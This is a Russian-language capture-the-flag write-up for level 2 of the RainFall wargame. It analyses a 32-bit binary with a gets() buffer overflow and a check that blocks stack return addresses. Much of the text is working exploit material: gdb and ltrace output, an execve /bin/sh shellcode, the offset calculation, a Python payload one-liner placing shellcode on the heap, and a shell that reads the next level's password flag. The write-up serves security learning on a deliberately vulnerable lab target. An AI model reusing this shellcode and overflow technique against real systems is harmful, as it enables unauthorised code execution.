Как и на уровне 1, мы можем найти исполняемый файл, ожидающий ввода, распечатать его и выйти после нажатия клавиши enter

Проанализировав его с помощью gdb, мы увидим, что функция main() вызывает функцию с именем p().
Пожалуйста, обратитесь к файлу asm_analysis.md параллельно с источником.c для получения более подробной информации.

Давайте сосредоточимся на функции p().
Как и на уровне 1, мы видим вызов функции gets(), которая уязвима для атаки переполнения буфера.
Выполняется проверка, чтобы убедиться, что мы не переписываем обратный адрес на адрес в стеке

   0x080484fb <+39>:    and    eax,0xb0000000
   0x08048500 <+44>:    cmp    eax,0xb0000000

Ограничение на наш обратный адрес, по-видимому, касается всего, что начинается с бита "b" (обозначается вычислением "и" со значением "0xb0000000").
Из-за этой проверки мы не смогли указать обратный адрес в стеке (диапазон 0xbf000000 - 0xbfffffff). Это позволяет избежать хранения шелл-кода в стеке или в переменной среды.
Но если мы не можем использовать стек, мы можем использовать кучу!
Мы видим в программе, что буфер позже копируется внутри strdup. Эта функция использует malloc, в котором хранится память... куча

   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>

Мы видим, что malloc всегда возвращает адрес 0x804a008 :

#level2@RainFall:~$ ltrace ./level2
#__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
#fflush(0xb7fd1a20)                               = 0
#gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5)    = 0xbffff6fc
#puts("")                                         = 1
#strdup("")                                       = 0x0804a008
#+++ exited (status 8) +++
#level2@RainFall:~$

Теперь мы можем попытаться скопировать шелл-код в кучу, записав его в строке ввода, а затем записать выделенный адрес (malloc) на обратный адрес.
шелл-код найден здесь
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
Давайте найдем смещение для записи поверх ip-адреса (обратный адрес) :

#level2@RainFall:~$ gdb level2
#(gdb) run
#Starting program: /home/user/level2/level2 
#Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
#
#Program received signal SIGSEGV, Segmentation fault.
#0x37634136 in ?? ()
#(gdb) info register eip
#eip            0x37634136       0x37634136
#(gdb)

Благодаря генератору шаблонов мы обнаружили, что смещение eip начинается с 80.
Поскольку наш шелл-код имеет длину 21 байт, мы могли бы дополнить его любой последовательностью байтов, до 80 байт, а затем 4 последних байта для обратного адреса.
Наш последний буфер атаки будет выглядеть так :

    шелл-код: 21 байт
    блокнот произвольных данных: 59 байт
    обратный адрес: 4 байта

level2@RainFall:~$ python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"' > /tmp/exploit

#level2@RainFall:~$ cat /tmp/exploit - | ./level2
#j
# XRh//shh/bin1̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
#whoami
#level3
#cat /home/user/level3/.pass  
#492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
#^C
#level2@RainFall:~$ su level3

